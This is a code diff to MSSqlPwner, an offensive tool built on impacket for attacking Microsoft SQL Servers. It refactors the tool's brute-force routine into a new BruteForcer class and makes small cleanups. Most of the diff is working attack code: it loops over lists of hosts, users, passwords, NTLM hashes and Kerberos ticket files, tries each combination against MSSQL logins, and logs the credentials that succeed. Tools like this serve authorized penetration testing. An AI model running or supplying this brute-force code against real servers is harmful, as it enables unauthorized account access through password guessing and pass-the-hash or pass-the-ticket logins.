@@ -4,6 +4,7 @@ import sys
 import json
 import logging
 from typing import Literal
+from pathlib import Path
 
 # Third party library imports
 from impacket import LOG
@@ -19,6 +20,175 @@ from prompt_toolkit.formatted_text import ANSI
 import mssqlpwner.utilities as utilities
 from mssqlpwner.playbooks import queries
 from mssqlpwner.classes.operations import Operations
+
+
+class BruteForcer:
+    def __init__(self, options):
+        self.options = options
+
+    def brute(
+        self,
+        host: str,
+        port: int,
+        user: str,
+        domain: str,
+        cred: str,
+        auth_type: Literal["ticket", "hash", "password"],
+    ) -> bool:
+        self.options.port = port
+
+        mssql_client = Playbooks(
+            server_address=host, user_name=user, args_options=self.options
+        )
+
+        if auth_type == "ticket":
+            if not os.path.exists(cred):
+                LOG.error(f"{cred} does not exist")
+                return False
+
+            if utilities.is_valid_ip(host):
+                LOG.warning(
+                    f"Skipping the {host} host since tickets are not supported for IP addresses"
+                )
+                return False
+
+            os.environ["KRB5CCNAME"] = cred
+            mssql_client.options.k = True
+            mssql_client.options.no_pass = True
+            mssql_client.options.hashes = None
+            password = ""
+        elif auth_type == "hash":
+            mssql_client.options.k = self.options.k
+            mssql_client.options.no_pass = False
+            mssql_client.options.hashes = cred.strip().lower()
+            password = ""
+        else:
+            mssql_client.options.k = self.options.k
+            mssql_client.options.no_pass = False
+            mssql_client.options.hashes = None
+            password = cred.strip()
+
+        LOG.setLevel(logging.CRITICAL)
+        if domain:
+            mssql_client.options.windows_auth = True
+
+        if mssql_client.connect(user, password, domain):
+            LOG.setLevel(logging.INFO)
+            full_user = f"{domain}\\{user}" if domain else user
+            LOG.info(
+                f"Successfully connected to {host} with user {full_user} and {auth_type} {cred}"
+            )
+            return True
+        LOG.setLevel(logging.DEBUG if self.options.debug else logging.INFO)
+        return False
+
+    def bruteforce(
+        self,
+        hosts_list: str,
+        user_list: str,
+        password_list: str,
+        hash_list: str,
+        ticket_list: str,
+    ) -> bool:
+        hosts_path = Path(hosts_list)
+        user_path = Path(user_list)
+        password_path = Path(password_list)
+        hash_path = Path(hash_list)
+        ticket_path = Path(ticket_list)
+
+        if not hosts_path.is_file():
+            LOG.error(f"{hosts_path} hosts file does not exist or is not a file")
+            return False
+        if not user_path.is_file():
+            LOG.error(f"{user_path} users file does not exist or is not a file")
+            return False
+        if (
+            not password_path.is_file()
+            and not hash_path.is_file()
+            and not ticket_path.is_file()
+        ):
+            LOG.error(
+                "You should provide at least one of the password, hash, or ticket list, and it should be a file"
+            )
+            return False
+
+        hosts_list_content = [
+            line.strip() for line in hosts_path.read_text().splitlines() if line.strip()
+        ]
+        user_list_content = [
+            line.strip() for line in user_path.read_text().splitlines() if line.strip()
+        ]
+
+        password_list_content = []
+        if password_path.is_file():
+            password_list_content = [
+                line.strip()
+                for line in password_path.read_text().splitlines()
+                if line.strip()
+            ]
+
+        hash_list_content = []
+        if hash_path.is_file():
+            hash_list_content = [
+                line.strip()
+                for line in hash_path.read_text().splitlines()
+                if line.strip()
+            ]
+
+        ticket_list_content = []
+        if ticket_path.is_file():
+            ticket_list_content = [
+                line.strip()
+                for line in ticket_path.read_text().splitlines()
+                if line.strip()
+            ]
+
+        LOG.info(
+            f"Starting brute force with {len(hosts_list_content)} hosts, {len(user_list_content)} users"
+        )
+        if password_list_content:
+            LOG.info(f"Using {len(password_list_content)} passwords")
+        if hash_list_content:
+            LOG.info(f"Using {len(hash_list_content)} NTLM hashes")
+        if ticket_list_content:
+            LOG.info(f"Using {len(ticket_list_content)} Kerberos tickets")
+
+        for host_line in hosts_list_content:
+            parts = host_line.split(":")
+            host = parts[0]
+            port = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1433
+
+            for user in user_list_content:
+                domain = ""
+                if "/" in user:
+                    domain, user = user.split("/")
+
+                for ticket in ticket_list_content:
+                    LOG.debug(f"Trying ticket for user {user} on host {host}:{port}")
+                    self.brute(
+                        host=host,
+                        port=int(port),
+                        user=user,
+                        domain=domain,
+                        cred=ticket,
+                        auth_type="ticket",
+                    )
+
+                for ntlm_hash in hash_list_content:
+                    if ":" not in ntlm_hash:
+                        LOG.error(
+                            f"{ntlm_hash} is not a valid NTLM hash, it should be in the format: NT:LM"
+                        )
+                        continue
+                    LOG.debug(f"Trying NTLM hash for user {user} on host {host}:{port}")
+                    self.brute(host, int(port), user, domain, ntlm_hash, "hash")
+
+                for password in password_list_content:
+                    LOG.debug(f"Trying password for user {user} on host {host}:{port}")
+                    self.brute(host, int(port), user, domain, password, "password")
+
+        LOG.info("Brute force attack completed")
+        return True
 
 
 class CompositeAutoSuggest(AutoSuggest):
@@ -363,12 +533,12 @@ class Playbooks(Operations):
 
             except KeyboardInterrupt:
                 if keyboard_interruption == 2:
-                    print(f"[!] Exiting")
+                    print("[!] Exiting")
                     break
 
                 keyboard_interruption += 1
                 print(
-                    f"[i] Keyboard interruption received. Not exiting.",
+                    "[i] Keyboard interruption received. Not exiting.",
                     flush=True,
                 )
                 continue
@@ -488,11 +658,9 @@ class Playbooks(Operations):
             LOG.error(f"An error occurred: {e}")
         return ret_val
 
-    def execute_module(self, chain_id, link_name, options):
-        """
-        This function is responsible to execute the given module.
-        """
-        link_name = link_name if link_name else self.state["hostname"]
+    def execute_module(self, chain_id: str, link_name: str, options) -> bool:
+        link_name = link_name or self.state["hostname"]
+
         if options.module == "enumerate":
             # It returned without calling since it is already called in the main function.
             utilities.print_state(self.state)
@@ -505,138 +673,9 @@ class Playbooks(Operations):
         else:
             if not self.is_valid_link_server(link_name):
                 return False
+
         for chain_id in self.get_execution_list(chain_id, link_name):
-            if not self.encapsulated_commands(chain_id, options):
-                continue
-            break
+            if self.encapsulated_commands(chain_id, options):
+                break
+
         return True
-
-    def brute(
-        self,
-        host: str,
-        port: int,
-        user: str,
-        domain: str,
-        cred: str,
-        auth_type: Literal["ticket", "hash", "password"],
-    ) -> bool:
-        self.options.port = port
-        mssql_client = Playbooks(host, port, self.options)
-        if auth_type == "ticket":
-            if not os.path.exists(cred):
-                LOG.error(f"{cred} does not exist")
-                return False
-
-            if utilities.is_valid_ip(host):
-                LOG.warning(
-                    f"Skipping the {host} host since tickets are not supported for IP addresses"
-                )
-                return False
-
-            os.environ["KRB5CCNAME"] = cred
-            mssql_client.options.k = True
-            mssql_client.options.no_pass = True
-            mssql_client.options.hashes = None
-            password = ""
-        elif auth_type == "hash":
-            mssql_client.options.k = self.options.k
-            mssql_client.options.no_pass = False
-            mssql_client.options.hashes = cred.strip().lower()
-            password = ""
-        else:
-            mssql_client.options.k = self.options.k
-            mssql_client.options.no_pass = False
-            mssql_client.options.hashes = None
-            password = cred.strip()
-        LOG.setLevel(logging.CRITICAL)
-        if domain:
-            mssql_client.options.windows_auth = True
-        if mssql_client.connect(user, password, domain):
-            LOG.setLevel(logging.INFO)
-            full_user = f"{domain}\\{user}" if domain else user
-            LOG.info(
-                f"Successfully connected to {host} with user {full_user} and {auth_type} {cred}"
-            )
-            return True
-        LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
-        return False
-
-    def bruteforce(
-        self,
-        hosts_list: str,
-        user_list: str,
-        password_list: str,
-        hash_list: str,
-        ticket_list: str,
-    ):
-        if not os.path.exists(hosts_list):
-            LOG.error(f"{hosts_list} hosts file does not exist")
-            return False
-        if (
-            not os.path.exists(password_list)
-            and not os.path.exists(hash_list)
-            and not os.path.exists(ticket_list)
-        ):
-            LOG.error(
-                "You should provide at least one of the password, hash or ticket list"
-            )
-            return False
-        if not os.path.exists(user_list):
-            LOG.error(f"{user_list} users file does not exist")
-            return False
-        hosts_list_content = open(hosts_list, "r").readlines()
-        user_list_content = open(user_list, "r").readlines()
-        password_list_content = []
-        hash_list_content = []
-        ticket_list_content = []
-
-        if os.path.exists(password_list):
-            password_list_content = open(password_list, "r").readlines()
-        if os.path.exists(hash_list):
-            hash_list_content = open(hash_list, "r").readlines()
-        if os.path.exists(ticket_list):
-            ticket_list_content = open(ticket_list, "r").readlines()
-
-        for host_line in hosts_list_content:
-            host_line = host_line.strip()
-            if not host_line:
-                continue
-            if not host_line.split(":")[-1].isdigit():
-                LOG.error(f"{host_line} is not a valid host, it should be host:port")
-                continue
-
-            host, port = host_line.split(":")
-
-            for user in user_list_content:
-                user = user.strip()
-                if not user:
-                    continue
-
-                domain = ""
-                if "/" in user:
-                    domain = user.split("/")[0]
-                    user = user.split("/")[1]
-
-                for ticket in ticket_list_content:
-                    ticket = ticket.strip()
-                    if not ticket:
-                        continue
-                    self.brute(host, port, user, domain, ticket, "ticket")
-
-                for ntlm_hash in hash_list_content:
-                    ntlm_hash = ntlm_hash.strip()
-                    if not ntlm_hash:
-                        continue
-
-                    if ":" not in ntlm_hash:
-                        LOG.error(
-                            f"{ntlm_hash} is not a valid NTLM hash, NTLM hash should be in that format: NT:LM"
-                        )
-                        continue
-                    self.brute(host, port, user, domain, ntlm_hash, "hash")
-
-                for password in password_list_content:
-                    password = password.strip()
-                    if not password:
-                        continue
-                    self.brute(host, port, user, domain, password, "password")
